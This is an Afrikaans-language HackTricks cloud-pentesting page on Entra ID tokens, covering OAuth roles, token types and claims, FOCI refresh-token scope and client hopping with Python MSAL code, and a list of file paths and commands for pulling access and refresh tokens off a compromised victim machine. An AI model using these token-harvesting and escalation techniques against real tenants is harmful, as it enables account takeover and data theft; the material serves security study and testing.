# Az - Tokens & Public Applications

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

Entra ID is Microsoft se cloud-gebaseerde identity and access management (IAM) platform en dien as die fondamentale authentication en authorization stelsel vir dienste soos Microsoft 365 en Azure Resource Manager. Azure AD implementeer die OAuth 2.0 authorization framework en die OpenID Connect (OIDC) authentication protocol om toegang tot hulpbronne te bestuur.

### OAuth

**Sleuteldeelnemers in OAuth 2.0:**

1. **Resource Server (RS):** Beskerm hulpbronne wat deur die resource owner besit word.
2. **Resource Owner (RO):** Gewoonlik 'n eindgebruiker wat die beskermde hulpbronne besit.
3. **Client Application (CA):** 'n Aplikasie wat toegang tot hulpbronne namens die resource owner soek.
4. **Authorization Server (AS):** Gee access tokens aan client applications nadat hulle geverifieer en geauthoriseer is.

**Scopes en Toestemming:**

- **Scopes:** Fyn-granulêre magtigings wat op die resource server gedefinieer word en toegangsvlakke spesifiseer.
- **Consent:** Die proses waardeur 'n resource owner 'n client application toestemming gee om hulpbronne met spesifieke scopes te gebruik.

**Microsoft 365 Integrasie:**

- Microsoft 365 gebruik Azure AD vir IAM en bestaan uit verskeie "first-party" OAuth applications.
- Hierdie toepassings is diep geïntegreer en het dikwels onderlinge diensverhoudings.
- Om gebruikerservaring te vereenvoudig en funksionaliteit te behou, gee Microsoft "implied consent" of "pre-consent" aan hierdie first-party applications.
- **Implied Consent:** Sekere toepassings word outomaties **toegestaan om toegang tot spesifieke scopes te kry sonder eksplisiete gebruiker- of administrateurgoedkeuring**.
- Hierdie pre-consented scopes is gewoonlik weggesteek vir beide gebruikers en administrateurs, wat hulle minder sigbaar maak in standaard bestuursinterfaces.

**Tipes Client Applications:**

1. **Confidential Clients:**
- Besit hul eie credentials (bv. passwords of sertifikate).
- Kan hulself **veilig autentiseer** na die authorization server.
2. **Public Clients:**
- Het nie unieke credentials nie.
- Kan nie veilig teenoor die authorization server autentiseer nie.
- **Sekuriteitsimplikasie:** 'n Aanvaller kan 'n public client application naboots wanneer hy tokens versoek, aangesien daar geen meganisme is vir die authorization server om die legitimiteit van die aplikasie te verifieer nie.

## Authentication Tokens

Daar is **drie tipes tokens** wat in OIDC gebruik word:

- [**Access Tokens**](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)**:** Die client bied hierdie token aan die resource server om toegang tot hulpbronne te kry. Dit kan slegs gebruik word vir 'n spesifieke kombinasie van gebruiker, client, en resource en **kan nie herroep word** tot dit verval — dit is standaard 1 uur.
- **ID Tokens**: Die client ontvang hierdie **token van die authorization server**. Dit bevat basiese inligting oor die gebruiker. Dit is **gebind aan 'n spesifieke kombinasie van gebruiker en client**.
- **Refresh Tokens**: Verskaf aan die client saam met die access token. Word gebruik om **nuwe access- en ID-tokens te kry**. Dit is gebind aan 'n spesifieke kombinasie van gebruiker en client en kan herroep word. Die standaard vervaltyd is **90 dae** vir inaktiewe refresh tokens en **geen vervaltyd vir aktiewe tokens** (van 'n refresh token is dit moontlik om nuwe refresh tokens te kry).
- 'n Refresh token behoort gekoppel te wees aan 'n **`aud`**, aan sekere **scopes**, en aan 'n **tenant** en dit behoort slegs in staat te wees om access tokens vir daardie aud, scopes (en nie meer nie) en tenant te genereer. Dit is egter nie die geval met **FOCI applications tokens** nie.
- 'n Refresh token is versleuteld en slegs Microsoft kan dit ontsleutel.
- Om 'n nuwe refresh token te kry herroep nie die vorige refresh token nie.

> [!WARNING]
> Inligting vir **conditional access** is **gestoor** binne die **JWT**. Dus, as jy die **token vanaf 'n toegelate IP-adres** versoek, sal daardie **IP** in die token **gestoor** word en jy kan daardie token dan vanaf 'n **nie-toegelate IP gebruik om toegang tot hulpbronne te kry**.

### Access Tokens "aud"

Die veld wat in die "aud" veld aangedui word is die **resource server** (die toepassing) wat gebruik word om die login uit te voer.

Die opdrag `az account get-access-token --resource-type [...]` ondersteun die volgende tipes en elkeen van hulle sal 'n spesifieke "aud" by die resulterende access token voeg:

> [!CAUTION]
> Neem asseblief kennis dat die onderstaande net die APIs is wat deur `az account get-access-token` ondersteun word, maar daar is meer.

<details>

<summary>aud examples</summary>

- **aad-graph (Azure Active Directory Graph API)**: Word gebruik om toegang te kry tot die legacy Azure AD Graph API (deprecated), wat toepassings toelaat om directory data in Azure Active Directory (Azure AD) te lees en te skryf.
- `https://graph.windows.net/`

* **arm (Azure Resource Manager)**: Word gebruik om Azure resources te bestuur via die Azure Resource Manager API. Dit sluit operasies in soos die skep, opdateer en verwyder van resources soos virtual machines, storage accounts, en meer.
- `https://management.core.windows.net/ or https://management.azure.com/`

- **batch (Azure Batch Services)**: Word gebruik om toegang te kry tot Azure Batch, 'n diens wat groot-skale parallelle en hoë-prestasie rekenaartoepassings in die cloud effektief moontlik maak.
- `https://batch.core.windows.net/`

* **data-lake (Azure Data Lake Storage)**: Word gebruik om met Azure Data Lake Storage Gen1 te kommunikeer, wat 'n skaalbare datastoor en analytics diens is.
- `https://datalake.azure.net/`

- **media (Azure Media Services)**: Word gebruik om toegang te kry tot Azure Media Services, wat cloud-gebaseerde media verwerking en afleweringsdienste vir video- en oudiomateriaal verskaf.
- `https://rest.media.azure.net`

* **ms-graph (Microsoft Graph API)**: Word gebruik om toegang te kry tot die Microsoft Graph API, die verenigde eindpunt vir Microsoft 365 diensdata. Dit laat jou toe om data en insigte van dienste soos Azure AD, Office 365, Enterprise Mobility en Security dienste te bekom.
- `https://graph.microsoft.com`

- **oss-rdbms (Azure Open Source Relational Databases)**: Word gebruik om toegang te kry tot Azure Database dienste vir open-source relationele databasismotors soos MySQL, PostgreSQL, en MariaDB.
- `https://ossrdbms-aad.database.windows.net`

</details>

### Access Tokens Scopes "scp"

Die scope van 'n access token word gestoor binne die scp sleutel binne die access token JWT. Hierdie scopes definieer waarna die access token toegang het.

As 'n JWT toegelaat word om 'n spesifieke API te kontak maar **nie die scope het** om die versoekte aksie uit te voer nie, sal dit **nie in staat wees om daardie aksie met daardie JWT uit te voer nie**.

### Kry voorbeeld van refresh- & access-token
```python
# Code example from https://github.com/secureworks/family-of-client-ids-research
import msal
import requests
import jwt
from pprint import pprint
from typing import Any, Dict, List


# LOGIN VIA CODE FLOW AUTHENTICATION
azure_cli_client = msal.PublicClientApplication(
"00b41c95-dab0-4487-9791-b9d2c32c80f2" # ID for Office 365 Management
)
device_flow = azure_cli_client.initiate_device_flow(
scopes=["https://graph.microsoft.com/.default"]
)
print(device_flow["message"])

# Perform device code flow authentication

azure_cli_bearer_tokens_for_graph_api = azure_cli_client.acquire_token_by_device_flow(
device_flow
)
pprint(azure_cli_bearer_tokens_for_graph_api)


# DECODE JWT
def decode_jwt(base64_blob: str) -> Dict[str, Any]:
"""Decodes base64 encoded JWT blob"""
return jwt.decode(
base64_blob, options={"verify_signature": False, "verify_aud": False}
)
decoded_access_token = decode_jwt(
azure_cli_bearer_tokens_for_graph_api.get("access_token")
)
pprint(decoded_access_token)


# GET NEW ACCESS TOKEN AND REFRESH TOKEN
new_azure_cli_bearer_tokens_for_graph_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
azure_cli_bearer_tokens_for_graph_api.get("refresh_token"),
# Same scopes as original authorization
scopes=["https://graph.microsoft.com/.default"],
)
)
pprint(new_azure_cli_bearer_tokens_for_graph_api)
```
### Ander access token-velde

- **appid**: Application ID wat gebruik is om die token te genereer
- **appidacr**: Die Application Authentication Context Class Reference dui aan hoe die client geverifieer is; vir 'n public client is die waarde 0, en as 'n client secret gebruik is is die waarde 1
- **acr**: Die Authentication Context Class Reference-claim is "0" wanneer die eindgebruiker se verifikasie nie aan die vereistes van ISO/IEC 29115 voldoen het nie.
- **amr**: Die Authentication method dui aan hoe die token geverifieer is. 'n Waarde van “pwd” dui aan dat 'n wagwoord gebruik is.
- **groups**: Dui die groups aan waarvan die principal 'n lid is.
- **iss**: Die iss identifiseer die security token service (STS) wat die token gegenereer het. e.g. https://sts.windows.net/fdd066e1-ee37-49bc-b08f-d0e152119b04/ (die uuid is die tenant ID)
- **oid**: Die object ID van die principal
- **tid**: Tenant ID
- **iat, nbf, exp**: Issued at (wanneer dit uitgereik is), Not before (kan nie gebruik word voor hierdie tyd nie, gewoonlik dieselfde waarde as iat), Expiration time.


## FOCI Tokens Privilege Escalation

Voorheen is genoem dat refresh tokens gekoppel behoort te wees aan die **scopes** waarmee dit gegenereer is, aan die **application** en **tenant** waarvoor dit gegenereer is. Indien enige van hierdie grense gebreek word, is dit moontlik om privileges te eskaleer omdat dit moontlik sal wees om access tokens te genereer vir ander resources en tenants waartoe die gebruiker toegang het, en met meer scopes as waarvoor dit oorspronklik bedoel was.

Verder, **this is possible with all refresh tokens** in the [Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/) (Microsoft Entra accounts, Microsoft personal accounts, and social accounts like Facebook and Google) omdat, soos die [**docs**](https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens) mention: "Refresh tokens are bound to a combination of user and client, but **aren't tied to a resource or tenant**. A client can use a refresh token to acquire access tokens **across any combination of resource and tenant** where it has permission to do so. Refresh tokens are encrypted and only the Microsoft identity platform can read them."

Let ook daarop dat FOCI applications public applications is, dus **no secret is needed** om by die server te autentiseer.

Die bekende FOCI clients wat in die [**original research**](https://github.com/secureworks/family-of-client-ids-research/tree/main) gerapporteer is, kan [**found here**](https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv).

### Kry 'n ander scope

In aansluiting by die vorige voorbeeldkode, word in hierdie kode 'n nuwe token versoek vir 'n ander scope:
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
azure_cli_bearer_tokens_for_outlook_api = (
# Same client as original authorization
azure_cli_client.acquire_token_by_refresh_token(
new_azure_cli_bearer_tokens_for_graph_api.get(
"refresh_token"
),
# But different scopes than original authorization
scopes=[
"https://outlook.office.com/.default"
],
)
)
pprint(azure_cli_bearer_tokens_for_outlook_api)
```
### Kry 'n ander client en scopes
```python
# Code from https://github.com/secureworks/family-of-client-ids-research
microsoft_office_client = msal.PublicClientApplication("d3590ed6-52b3-4102-aeff-aad2292ab01c")
microsoft_office_bearer_tokens_for_graph_api = (
# This is a different client application than we used in the previous examples
microsoft_office_client.acquire_token_by_refresh_token(
# But we can use the refresh token issued to our original client application
azure_cli_bearer_tokens_for_outlook_api.get("refresh_token"),
# And request different scopes too
scopes=["https://graph.microsoft.com/.default"],
)
)
# How is this possible?
pprint(microsoft_office_bearer_tokens_for_graph_api)
```
## Waar om tokens te vind

Uit 'n aanvaller se perspektief is dit baie interessant om te weet waar toegangstokens en verversingstokens gevind kan word wanneer byvoorbeeld die PC van 'n slagoffer gekompromitteer word:

- Binne **`<HOME>/.Azure`**
- **`azureProfile.json`** bevat inligting oor gebruikers wat in die verlede aangemeld was
- **`clouds.config contains`** bevat inligting oor intekeninge
- **`service_principal_entries.json`** bevat toepassingsinlogbewyse (tenant id, clients en geheim). Slegs in Linux & macOS
- **`msal_token_cache.json`** bevat toegangstokens en verversingstokens. Slegs in Linux & macOS
- **`service_principal_entries.bin`** and msal_token_cache.bin word in Windows gebruik en is met DPAPI geënkripteer
- **`msal_http_cache.bin`** is 'n kas van HTTP-versoeke
- Laai dit: `with open("msal_http_cache.bin", 'rb') as f: pickle.load(f)`
- **`AzureRmContext.json`** bevat inligting oor vorige aanmeldings wat Az PowerShell gebruik het (maar geen inlogbewyse nie)
- Binne **`C:\Users\<username>\AppData\Local\Microsoft\IdentityCache\*`** is verskeie `.bin`-lêers met toegangstokens, ID-tokens en rekeninginligting wat met die gebruiker se DPAPI geënkripteer is.
- Dit is moontlik om meer toegangstokens te vind in die `.tbres`-lêers binne **`C:\Users\<username>\AppData\Local\Microsoft\TokenBroken\Cache\`** wat 'n base64 bevat wat met DPAPI geënkripteer is met toegangstokens.
- In Linux en macOS kan jy toegangstokens, verversingstokens en ID-tokens van Az PowerShell kry (as dit gebruik is) deur `pwsh -Command "Save-AzContext -Path /tmp/az-context.json"` uit te voer
- In Windows genereer dit net ID-tokens.
- Dit is moontlik om te sien of Az PowerShell in Linux en macSO gebruik is deur te kontroleer of `$HOME/.local/share/.IdentityService/` bestaan (alhoewel die ingeslote lêers leeg en nutteloos is)
- As die gebruiker in Azure met die browser aangemeld is, volgens hierdie [**post**](https://www.infosecnoodle.com/p/obtaining-microsoft-entra-refresh?r=357m16&utm_campaign=post&utm_medium=web) is dit moontlik om die autentikasievloei te begin met 'n **omleiding na localhost**, die browser outomaties die aanmelding te laat magtig, en die verversingstoken te ontvang. Let daarop dat daar net 'n paar FOCI-toepassings is wat 'n redirect na localhost toelaat (soos az cli of die powershell-module), dus moet hierdie toepassings toegelaat wees.
- 'n Ander opsie wat in die blog verduidelik word, is om die tool [**BOF-entra-authcode-flow**](https://github.com/sudonoodle/BOF-entra-authcode-flow) te gebruik wat enige toepassing kan gebruik omdat dit **die OAuth-kode sal kry om dan 'n verversingstoken uit die titel van die finale auth** blad te kry deur die redirect URI `https://login.microsoftonline.com/common/oauth2/nativeclient` te gebruik.

## References

- [https://github.com/secureworks/family-of-client-ids-research](https://github.com/secureworks/family-of-client-ids-research)
- [https://github.com/Huachao/azure-content/blob/master/articles/active-directory/active-directory-token-and-claims.md](https://github.com/Huachao/azure-content/blob/master/articles/active-directory/active-directory-token-and-claims.md)

{{#include ../../../banners/hacktricks-training.md}}
